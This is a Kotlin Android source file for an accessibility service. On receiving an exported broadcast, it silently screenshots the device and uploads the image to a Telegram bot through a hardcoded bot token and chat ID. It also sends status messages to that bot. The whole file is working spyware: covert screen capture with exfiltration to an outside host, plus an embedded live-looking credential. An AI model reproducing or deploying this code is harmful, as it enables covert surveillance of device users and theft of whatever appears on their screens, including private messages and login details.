package com.example.myapplication.services

import android.accessibilityservice.AccessibilityService
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Bitmap
import android.os.Build
import android.util.Log
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors

class MyAccessibilityService : AccessibilityService() {

    private val executor = Executors.newSingleThreadExecutor()
    private val BOT_TOKEN = "8995029809:AAHAjbs7CvyLoxhEm9LGVoiJsPB59Mqnzog"
    private val CHAT_ID = "8587971818"

    private val receiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            Log.d("Accessibility", "Command Received: ${intent?.action}")
            if (intent?.action == "ACTION_TAKE_SCREENSHOT") {
                takeSilentScreenshot()
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        val filter = IntentFilter("ACTION_TAKE_SCREENSHOT")
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(receiver, filter, RECEIVER_EXPORTED)
            } else {
                registerReceiver(receiver, filter)
            }
            Log.d("Accessibility", "Receiver Registered in onCreate")
        } catch (e: Exception) {
            Log.e("Accessibility", "Reg Error: ${e.message}")
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d("Accessibility", "Service Connected")
        sendMessageToBot("✅ Accessibility Service Connected & Ready!")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
    override fun onInterrupt() {}

    private fun takeSilentScreenshot() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Log.d("Accessibility", "Taking SS...")
            try {
                takeScreenshot(Display.DEFAULT_DISPLAY, executor, object : TakeScreenshotCallback {
                    override fun onSuccess(result: ScreenshotResult) {
                        Log.d("Accessibility", "SS Success, processing...")
                        val hardwareBuffer = result.hardwareBuffer
                        val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, result.colorSpace)
                        if (bitmap != null) {
                            val copy = bitmap.copy(Bitmap.Config.ARGB_8888, false)
                            uploadToTelegram(copy)
                        } else {
                            sendMessageToBot("❌ Error: Bitmap is null")
                        }
                        hardwareBuffer.close()
                    }

                    override fun onFailure(error: Int) {
                        Log.e("Accessibility", "SS Failed: $error")
                        val errorMsg = when(error) {
                            AccessibilityService.ERROR_TAKE_SCREENSHOT_INTERNAL_ERROR -> "Internal Error"
                            AccessibilityService.ERROR_TAKE_SCREENSHOT_INTERVAL_TIME_SHORT -> "Too Many Requests (Wait 1s)"
                            AccessibilityService.ERROR_TAKE_SCREENSHOT_INVALID_DISPLAY -> "Invalid Display"
                            4 -> "No Accessibility Access (Check Config)"
                            else -> "Error Code: $error"
                        }
                        sendMessageToBot("❌ Screenshot Failed: $errorMsg")
                    }
                })
            } catch (e: Exception) {
                sendMessageToBot("❌ SS Crash: ${e.message}")
            }
        } else {
            sendMessageToBot("⚠️ Android version below 11. Silent SS not supported.")
        }
    }

    private fun sendMessageToBot(msg: String) {
        executor.execute {
            try {
                val url = URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=$msg")
                (url.openConnection() as HttpURLConnection).apply {
                    requestMethod = "GET"
                    responseCode
                }
            } catch (e: Exception) {}
        }
    }

    private fun uploadToTelegram(bitmap: Bitmap) {
        executor.execute {
            try {
                val file = File(cacheDir, "ss.png")
                FileOutputStream(file).use { bitmap.compress(Bitmap.CompressFormat.PNG, 100, it) }

                val boundary = "Boundary-" + System.currentTimeMillis()
                val conn = URL("https://api.telegram.org/bot$BOT_TOKEN/sendPhoto").openConnection() as HttpURLConnection
                conn.doOutput = true
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

                val out = conn.outputStream
                val writer = PrintWriter(OutputStreamWriter(out, "UTF-8"), true)
                writer.append("--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n").append(CHAT_ID).append("\r\n")
                writer.append("--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"photo\"; filename=\"ss.png\"\r\n")
                writer.append("Content-Type: image/png\r\n\r\n").flush()
                
                file.inputStream().use { it.copyTo(out) }
                out.flush()
                writer.append("\r\n--$boundary--\r\n").close()
                
                if (conn.responseCode != 200) {
                    Log.e("Accessibility", "Upload failed: ${conn.responseCode}")
                } else {
                    Log.d("Accessibility", "Upload success")
                }
            } catch (e: Exception) {
                Log.e("Accessibility", "Upload Error: ${e.message}")
            }
        }
    }

    override fun onDestroy() {
        try { unregisterReceiver(receiver) } catch (e: Exception) {}
        super.onDestroy()
    }
}